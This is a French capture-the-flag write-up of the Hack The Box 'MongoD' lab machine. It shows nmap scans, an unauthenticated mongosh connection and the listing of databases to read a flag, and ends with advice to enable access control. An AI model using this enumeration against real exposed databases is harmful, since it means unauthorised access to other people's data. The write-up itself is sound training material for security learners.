---
title: "MongoD"
date: 2026-01-15
description: "Découverte d'un service de base de données NoSQL."
authors: [ravenbreach]
tags: [writeups, hackthebox, starting-point, misconfiguration, linux, database, vip, tier-0]
slug: mongod
---

# Introduction

Bienvenue pour cette septième étape de notre parcours **Starting Point**. Aujourd'hui, on s'attaque à **MongoD**. On va mettre les mains dans le cambouis avec **MongoDB**, une base de données **NoSQL** extrêmement populaire.

:::tip
Attention : Il s'agit d'une machine VIP. Vous aurez besoin d'un abonnement HTB pour pouvoir la lancer.
:::

:::warning
Dans ce writeup, je ne publie pas directement le flag final, l'objectif est d'apprendre en pratiquant.
:::

:::caution
N'attaquez que des machines sur lesquelles vous avez l'autorisation. Respectez les règles de la plateforme.
:::

Le scénario est un grand classique du "fail" en sysadmin : une base de données ultra-performante dont la porte a été laissée grande ouverte sans aucun verrou (authentification).

[▶ RavenBreach sur YouTube](https://www.youtube.com/@Raven_Breach/videos)

---

## Reconnaissance

### Découverte d'hôte

```bash
┌─[user@parrot]─[~]
└──╼ $ping 10.129.228.30

64 bytes from 10.129.228.30: icmp_seq=1 ttl=63 time=59.3 ms
```

### Énumération des services

Le scan classique ne montre que SSH. On scanne **tous** les ports.

```bash
┌─[user@parrot]─[~]
└──╼ $nmap -p- --min-rate=100 -sV 10.129.228.30

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu
27017/tcp open  mongod?
```

Port **27017** : c'est **MongoDB** ! Le fingerprint nmap confirme : "It looks like you are trying to access MongoDB over HTTP on the native driver port."

---

## Pré-Exploitation

### Installation des outils

Pour parler à MongoDB, il nous faut **mongosh**.

:::tip
Sur cette machine, il est conseillé d'utiliser la version 2.3.2 pour éviter les problèmes de compatibilité.
:::

```bash
curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
tar xvf mongosh-2.3.2-linux-x64.tgz
```

---

## Exploitation

### Connexion à la base de données

```bash
┌─[user@parrot]─[~/mongosh-2.3.2-linux-x64/bin]
└──╼ $./mongosh mongodb://10.129.228.30:27017

** WARNING: Access control is not enabled for the database.
**          Read and write access to data and configuration is unrestricted.

test>
```

L'avertissement est explicite : **aucun contrôle d'accès**. On a les pleins pouvoirs sans mot de passe.

### Fouille des données

```bash
test> show dbs

admin                   32.00 KiB
sensitive_information   32.00 KiB
users                   32.00 KiB
```

La base **sensitive_information** nous appelle. On s'y connecte et on liste les collections.

```bash
test> use sensitive_information
test> show collections

flag
```

On lit le contenu de la collection `flag`.

```bash
sensitive_information> db.flag.find()

[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6{...}6ea'
  }
]
```

La machine est **pwned** !

---

## Post-Exploitation

MongoDB, dans ses anciennes configurations, ne limite pas l'accès aux interfaces réseaux. Si l'administrateur n'active pas le RBAC (Role-Based Access Control), le serveur accepte n'importe quelle connexion.

**Leçon** : une base de données ne doit JAMAIS être exposée sur le réseau public sans authentification robuste et, idéalement, avec un accès limité par IP.
